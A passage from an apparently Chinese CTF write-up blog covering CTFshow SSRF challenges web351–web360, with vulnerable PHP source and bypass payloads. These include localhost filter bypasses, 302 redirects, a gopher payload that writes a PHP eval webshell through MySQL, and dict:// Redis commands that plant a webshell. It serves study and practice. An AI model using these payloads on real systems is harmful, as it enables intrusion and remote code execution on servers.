number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><ol><li><code>$ch=curl_init($url);</code>：这行代码初始化cURL会话，并将变量<code>$url</code>作为要请求的URL。</li><li><code>curl_setopt($ch, CURLOPT_HEADER, 0);</code>：设置cURL选项，告诉cURL不要在输出中包含HTTP头信息。</li><li><code>curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</code>：设置cURL选项，使得执行<code>curl_exec</code>后返回的不是直接输出，而是将结果作为字符串返回。</li><li><code>$result=curl_exec($ch);</code>：执行cURL会话，并获取结果，存储在变量<code>$result</code>中。</li><li><code>curl_close($ch);</code>：关闭cURL会话，释放资源。</li></ol><p>Payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/flag.php</span>  url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//localhost/flag.php</span>  url<span class="token operator">=</span>file<span class="token punctuation">:</span><span class="token comment">///var/www/html/flag.php</span></code></pre><h4 id="web352-localhost-127-0-0-1绕过"><a href="#web352-localhost-127-0-0-1绕过" class="headerlink" title="web352(localhost|127.0.0.1绕过)"></a>web352(localhost|127.0.0.1绕过)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127.0.0/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> hacker</code></pre><p>得有<code>http|https</code>但是ban了<code>localhost|127.0.0</code>(幽默过滤，后面没有1，所以之前payload也可以)</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php">十六进制url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0x7F.0.0.1/flag.php</span>八进制url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0177.0.0.1/flag.php</span><span class="token number">10</span> 进制整数格式url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//2130706433/flag.php</span><span class="token number">16</span> 进制整数格式，还是上面那个网站转换记得前缀<span class="token number">0</span>xurl<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0x7F000001/flag.php</span>还有一种特殊的省略模式<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>写成<span class="token number">127.1</span>用<span class="token constant">CIDR</span>绕过localhosturl<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//127.127.127.127/flag.php</span>url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0/flag.php</span>url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0.0.0.0/flag.php</span>payload：url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//127.1/flag.php</span></code></pre><p>补充一点</p><p><code>parse_url</code> 是 PHP 中的一个函数，用于解析一个 URL 并返回其组成部分作为数组。这个函数非常适用于需要从 URL 中提取协议、主机名、路径等信息的场景。</p><p><strong>函数原型</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$component</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span></code></pre><p><strong>参数</strong></p><ul><li><p><code>$url</code>：需要解析的 URL 字符串。</p></li><li><p><code>$component</code>（可选）：指定返回 URL 的哪个部分。可以是以下常量之一：</p><ul><li><code>PHP_URL_SCHEME</code>：返回 URL 的协议部分（如 <code>http</code>, <code>https</code>）。</li><li><code>PHP_URL_HOST</code>：返回 URL 的主机部分（如 <code>www.example.com</code>）。</li><li><code>PHP_URL_PORT</code>：返回 URL 的端口部分（如果存在）。</li><li><code>PHP_URL_USER</code>：返回 URL 的用户名部分（如果存在）。</li><li><code>PHP_URL_PASS</code>：返回 URL 的密码部分（如果存在）。</li><li><code>PHP_URL_PATH</code>：返回 URL 的路径部分（如 <code>/path/to/resource</code>）。</li><li><code>PHP_URL_QUERY</code>：返回 URL 的查询字符串部分（如果存在）。</li><li><code>PHP_URL_FRAGMENT</code>：返回 URL 的片段标识符部分（如果存在）。</li></ul><p>如果省略此参数或设置为 <code>-1</code>，<code>parse_url</code> 将返回包含所有部分的数组。</p></li></ul><p><strong>返回值</strong></p><ul><li>如果成功，返回一个数组，包括 URL 的各个组成部分。</li><li>如果 URL 格式不正确或无法解析，返回 <code>false</code>。</li></ul><h4 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127\.0\.|\。/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>多过滤了句号，上题Payload也可以</p><h4 id="web354-解析域名"><a href="#web354-解析域名" class="headerlink" title="web354(解析域名)"></a>web354(解析域名)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|1|0|。/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>1和0过滤了</p><p>302跳转，vps搭一个 :</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: http://127.0.0.1/flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>POST: url&#x3D;<a href="http://your-domain/ssrf/302.php">http://your-domain/ssrf/302.php</a><br>Y4师傅找到一个A记录是127.0.0.1的网站: <a href="http://sudo.cc/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%B8%8D%E7%94%A8%E8%A7%A3%E6%9E%90%E8%87%AA%E5%B7%B1%E7%9A%84%E4%BA%86">http://sudo.cc/，可以不用解析自己的了</a><br>payload:url&#x3D;<a href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a></p><h4 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$host</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>没有做其他过滤，但限制了<code>host</code>的长度</p><p>0在linux系统中会解析成127.0.0.1在windows中解析成0.0.0.0</p><p>Payload：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0/flag.php</span>  url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//127.1/flag.php</span></code></pre><h4 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0/flag.php</span></code></pre><h4 id="web357-重定向"><a href="#web357-重定向" class="headerlink" title="web357(重定向)"></a>web357(重定向)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/br>'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">,</span> <span class="token class-name">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="token operator">|</span> <span class="token class-name">FILTER_FLAG_NO_RES_RANGE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ip!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> scheme</code></pre><ol><li><code>$ip = gethostbyname($x[&#39;host&#39;]);</code>：使用<code>gethostbyname</code>函数获取URL主机名对应的IP地址。</li><li><code>if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</code>：使用<code>filter_var</code>函数和相应的过滤器检查IP地址是否有效，并且不是私有地址或保留地址。如果IP地址无效，将执行<code>die(&#39;ip!&#39;);</code>终止脚本执行。</li></ol><ul><li><code>filter_var</code>：这是PHP内置的函数，用于过滤变量并进行验证。它接受两个参数：第一个是要验证的变量，第二个是过滤选项。</li><li><code>FILTER_VALIDATE_IP</code>：这是一个用于 <code>filter_var</code> 的选项，用来验证提供的变量是否是一个有效的IP地址。</li><li><code>FILTER_FLAG_NO_PRIV_RANGE</code>：这是一个可选的标志，用来排除私有IP地址范围。私有IP地址通常用于内部网络，并不在互联网上路由。这些地址包括以下范围：</li><li><ul><li><code>10.0.0.0</code> 到 <code>10.255.255.255</code></li><li><code>172.16.0.0</code> 到 <code>172.31.255.255</code></li><li><code>192.168.0.0</code> 到 <code>192.168.255.255</code></li></ul></li><li><code>FILTER_FLAG_NO_RES_RANGE</code>：这是另一个可选的标志，用来排除保留的IP地址范围。保留的IP地址通常不分配给特定的网络设备，而用于特殊用途，如多播地址。</li><li><code>$ip</code>：这是要验证的IP地址变量。</li><li><code>if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE))</code>：这条 <code>if</code> 语句检查 <code>$ip</code> 是否通过了验证。如果 <code>$ip</code> 不是一个有效的IP地址，或者是一个私有或保留的IP地址，<code>filter_var</code> 将返回 <code>false</code>，然后执行 <code>if</code> 语句块内的代码。</li></ul><p>利用302跳转和dns重绑定都可以。<br>在自己服务器上写个index.php文件内容如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location:http://127.0.0.1/flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p>Payload：</p><pre class="language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//xxx.xxx.xxx.xx/xxx.php</span></code></pre><h4 id="web358-127-0-0-1"><a href="#web358-127-0-0-1" class="headerlink" title="web358(@127.0.0.1)"></a>web358(@127.0.0.1)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^http:\/\/ctf\..*show$/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>正则表达式的意思是以<a href="http://ctf./">http://ctf.</a>开头，以show结尾。</p><p>以show结尾比较好办，要么#show，要么?a&#x3D;show这样的都可以。</p><p>以<a href="http://ctf.开头的话，加上一个@127.0.0.1就可以绕过了，这样parse_url解析出来的host是127.0.0.1，考虑到ftp：">http://ctf.开头的话，加上一个@127.0.0.1就可以绕过了，这样parse_url解析出来的host是127.0.0.1，考虑到ftp：</a></p><p><a href="ftp://user[:pass]@ip[:port]/path，因此前面的ctf.会被解析成user。">ftp://user[:pass]@ip[:port]/path，因此前面的ctf.会被解析成user。</a></p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php">url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//ctf.@127.0.0.1/flag.php#show</span></code></pre><h4 id="web359-mysql-gopherus"><a href="#web359-mysql-gopherus" class="headerlink" title="web359(mysql gopherus)"></a>web359(mysql gopherus)</h4><p>Hint:打无密码的mysql</p><p><a href="https://blog.csdn.net/qq_41107295/article/details/103026470">SSRF利用 Gopher 协议拓展攻击面</a></p><p><a href="https://blog.csdn.net/crisprx/article/details/104251284">SSRF利用 Gopher |Gopher攻击mysql及内网</a></p><p><img src="web359.png" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%30%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01</span></code></pre><p>把<code>_</code>后的再进行一次url编码</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2530%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2522%2501%2500%2500%2500%2501</span></code></pre><p>最后访问1.php进行RCE即可</p><h4 id="web360-redis"><a href="#web360-redis" class="headerlink" title="web360(redis)"></a>web360(redis)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><p>ssrf打redis，基本上四种攻击方式：</p><ul><li>写webshell</li><li>写ssh公钥</li><li>写contrab计划任务反弹shell</li><li>主从复制</li></ul><p>这题肯定是写shell了，先利用dict探测一下端口，看看6379存不存在，如果目标的redis换端口了，就利用dict协议来探测：</p><p><img src="web360.png" loading="lazy"></p><p><a href="https://xz.aliyun.com/t/5665?time__1311=n4+xni5mqYqQw4CqGNDQTbm2+G8febDBmGoD">浅析Redis中SSRF的利用</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/113853929">CTFshow ssrf</a></p><pre class="language-php" data-language="php"><code class="language-php"># 设置一下dir，即本地数据库存放目录：dict://127.0.0.1:6379/config:set:dir:/var/www/html# 写马，可能会有转义或者过滤的情况，所以用16进制一般都能写成功。# <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>dict://127.0.0.1:6379/set:shell:"\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x30\x5d\x29\x3b\x3f\x3e"# 设置文件dict://127.0.0.1:6379/config:set:dbfilename:hsad.php# 保存dict://127.0.0.1:6379/save# 访问hsad.php进行rce</code></pre><p>当然也可以使用gopherus</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
